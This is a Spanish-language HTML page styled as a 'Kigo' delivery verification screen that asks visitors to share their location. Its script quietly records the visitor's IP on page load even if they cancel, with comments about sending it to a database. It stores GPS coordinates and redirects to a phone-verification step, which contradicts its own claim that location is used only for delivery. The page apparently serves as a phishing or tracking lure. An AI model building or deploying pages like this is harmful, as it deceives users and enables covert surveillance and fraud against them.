<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kigo - Verificación</title>
<style>
  body { margin:0; font-family: -apple-system, sans-serif; background:#fff; display:flex; justify-content:center; align-items:center; min-height:100vh; }
  .container { max-width:380px; width:90%; text-align:center; padding:20px; }
  .illustration { width:100%; margin-bottom:20px; }
  h1 { font-size:28px; font-weight:800; color:#111; line-height:1.2; margin:10px 0; }
  p.sub { color:#666; font-size:16px; margin-bottom:25px; }
  p.legal { font-size:11px; color:#888; margin-bottom:25px; }
  .btn { width:100%; padding:16px; border-radius:50px; border:none; font-size:18px; font-weight:700; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:10px; margin-bottom:12px; }
  .btn-green { background:#1DB954; color:white; }
  .btn-red { background:#FF4A4A; color:white; }
</style>
</head>
<body>
<div class="container">
  <img src="tu-imagen-repartidor.png" class="illustration" alt="repartidor">

  <h1>Para continuar,<br>necesitamos tu ubicación</h1>
  <p class="sub">Comparte tu ubicación para recibir tu pedido más rápido y seguro.</p>

  <p class="legal">Al continuar aceptas nuestra <b>Política de Privacidad</b> y Términos de uso. Tu ubicación solo se usa para la entrega.</p>

  <button class="btn btn-green" onclick="pedirUbicacion()">
    📍 Permitir ubicación
  </button>
  <button class="btn btn-red" onclick="cancelar()">
    ✕ Cancelar
  </button>
</div>

<script>
  // Guarda IP aunque cancele
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
      console.log("IP guardada:", data.ip);
      // Aquí la mandas a tu base de datos
      localStorage.setItem('ip_intento', data.ip);
    });

  function pedirUbicacion(){
    if(!navigator.geolocation){
      alert("Tu celular no permite GPS");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        console.log("GPS permitido:", pos.coords.latitude, pos.coords.longitude);
        // Guardas GPS y lo dejas pasar a verificar celular
        localStorage.setItem('gps_lat', pos.coords.latitude);
        localStorage.setItem('gps_lng', pos.coords.longitude);
        window.location.href = "/verificar-celular.html"; // siguiente paso
      },
      (err) => {
        alert("Necesitas activar tu GPS para hacer el pedido. Por favor da clic en Permitir.");
      }
    );
  }

  function cancelar(){
    alert("Sin tu ubicación no podemos enviar al repartidor para evitar pedidos falsos.");
    // Aquí ya tienes su IP guardada
  }
</script>
</body>
</html>
